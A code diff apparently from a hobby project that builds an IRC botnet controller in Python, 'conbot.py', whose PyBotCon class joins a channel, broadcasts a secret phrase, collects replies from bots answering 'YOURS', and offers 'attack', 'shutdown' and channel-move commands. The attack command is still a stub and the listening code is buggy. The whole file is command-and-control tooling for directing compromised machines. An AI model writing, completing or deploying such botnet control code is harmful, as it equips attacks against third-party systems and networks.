@@ -5,6 +5,7 @@ import socket
 import random
 import string
 import time
+from datetime import timedelta, datetime
 
 class PyBotCon:
 # NOTES --> Have to thread a listener into this program to listen for responses in a while(True) loop
@@ -16,7 +17,7 @@ class PyBotCon:
 # In the 5 seconds of wait time the socket will cache the data it receives
 # After wait time (or before) the program will prompt for user input
   #PyBot object constructor 
-  def __init__(self,host,port,channel,secret,s):
+  def __init__(self,host,port,channel,secret):
 
     #Create PyBotCon instanace variables
     self.host = host
@@ -27,21 +28,38 @@ class PyBotCon:
     self.controlMode = 0 #default 0 = bot not being controller
 
     try: # NOTE: Should put this in some kind of loop so the bot can retry, generateRandomName() should be called from inside of the loop
-      self.s = s.connect((host,int(port)))
-      s.send(bytes("NICK " + self.nick + "\n", "UTF-8"))
-      s.send(bytes("USER " +self.nick+" "+self.nick+" "+self.nick+ " " + self.nick+ "\n","UTF-8"))
+      self.ircsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+      self.ircsock.connect((host,int(port)))
+      self.ircsock.send(bytes("USER " +self.nick+" "+self.nick+" "+self.nick+ " " + self.nick+ "\n","UTF-8"))
+      self.ircsock.send(bytes("NICK " + self.nick + "\n", "UTF-8"))
     except:
       print("unable to connect to irc server")
-    s.send(bytes("JOIN " + channel + "\n", "UTF-8")) #Join channel
+
+#    self.ircsock.send(bytes("JOIN " + channel + "\n", "UTF-8")) #Join channel
+    self.joinChan()
+    self.identifyBots()
+    self.conMain()
 #    self.listen()
+
+  def generateRandomName(self):
+    randomName = "".join(random.choice(string.ascii_uppercase + string.digits) for i in range(8))
+    return randomName
+
+  def joinChan(self):
+    self.ircsock.send(bytes("JOIN "+self.channel+"\n", "UTF-8"))
+    return
+#    msg=""
+#    while msg.find("End of /NAMES list.") == -1:
+#      msg = self.ircsock.recv(2048).decode("UTF-8")
+#      msg = msg.strip("\n\r")
 
   def conMain(self):
     while(True):
       print("command> ",end='')
       command = input()
       if(command == "status"):
-        self.identifyBots(self.secret,self.channel)
-        print(srt(len(self.botList))+" bots found: " + str(self.botList))
+        self.identifyBots()
+        print(str(len(self.botList))+" bots found: " + str(self.botList))
       elif(command.startswith("attack")):
         # NOTE --> Need to create a function for sending the attack command
         print("Call attack function here")
@@ -52,14 +70,24 @@ class PyBotCon:
       elif(command=="quit"):
         # NOTE --> Might need to actually disconnect form the IRC server before exiting the program, will have to look into this
         sys.exit("Command Bot Disconnected")
-      elif(comand=="shutdown"):
-        sys.exit("Not Iplemented")
+      elif(command=="shutdown"):
+        sys.exit("Not Implemented")
         # Need to create a function for sending shutdown message to the channel
+      data = ""
+      data = self.ircsock.recv(4096).decode("UTF-8")
+      data = data.strip("\n\r")
+      print("DEBUG --> data recieved: " + data)
+
+      if data.find("PING :") != -1:  #Respond to server pings (keep alive)
+        self.ping()
+
+  def ping(self):
+    self.ircsock.send(bytes("PONG :pingis\n","UTF-8"))
 
   def listen(self):
     while True:
       data = ""
-      data = s.recv(4096).decode("UTF-8")
+      data = ircsock.recv(4096).decode("UTF-8")
       data = data.strip("\n\r")
       print("DEBUG --> data recieved: " + data)
 
@@ -82,23 +110,25 @@ class PyBotCon:
       self.control = 1
 
   def changeChannel(self,channel,newServer, newPort, newChannel):
-    self.s.send(bytes("PRIVMSG" + channel + " " + "move " + newServer + " " + newPort + " " + newChannel + "\n"))  
+    self.ircsock.send(bytes("PRIVMSG" + channel + " " + "move " + newServer + " " + newPort + " " + newChannel + "\n","UTF-8"))  
 
-  def identifyBots(self,secret,channel):
-    self.s.send(bytes("PRIVMSG " + channel + " " + secret + "\n")) # Send 'hello' message for bots to identify themselves
+  def identifyBots(self):
+    # Send 'hello' message for bots to identify themselves
+    self.ircsock.send(bytes("PRIVMSG " + self.channel + " " + self.secret + "\n","UTF-8")) 
     self.botList = [] # botList starts as an empty list: it is cleared and rebuilt every time this function is called
     time.sleep(6)
-    for i in range(10): 
+#    period = timedelta(seconds=5)
+#    endLoop = datetime.now() + period
+    while self.ircsock.recv(2048) != None:
 # NOTE --> I'm not sure how I should be listening for bot replies, this will need to be adjusted
-      data = self.s.recv(4096).decode("UTF-8")
+      data = self.ircsock.recv(2048).decode("UTF-8")
       data = data.strip("\r\n")
-      if(data.find("PRIVMSG {} :".format(self.nick))!=-1 and data.split("PRIVMSG",1)[1].split(":",1)[1]=="YOURS"): # NOTE --> The response message that we're expecting from bots is "YOURS"
-        temp = data.split("!",1)[0][1:] # Finds name of the bot reply
-        self.botList.append(temp[0][1:]) # Adds the name of the bot reply to botList
+      if(data.find(".tell")!=-1 and data.split("PRIVMSG",1)[1].split(":",1)[1]=="YOURS"): # NOTE --> The response message that we're expecting from bots is "YOURS"
+        temp = data.split("BotName$$: ")[1][0:7] # Finds name of the bot reply
+        self.botList.append(temp) # Adds the name of the bot reply to botList
+    return
 
-  def generateRandomName(self):
-    randomName = "".join(random.choice(string.ascii_uppercase + string.digits) for i in range(8))
-    return randomName
+
         
 
 #Main
@@ -113,8 +143,8 @@ if __name__ == '__main__':
     print("Incorrect number of arguments")
     sys.exit("Usage: conbot.py <hostname> <port> <channel> <secret-phrase>")
 
-  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-  conBot = PyBotCon(host,port,channel,secret,s) #Create an instance of the bot 
+
+  conBot = PyBotCon(host,port,channel,secret) #Create an instance of the bot 
   
 
 
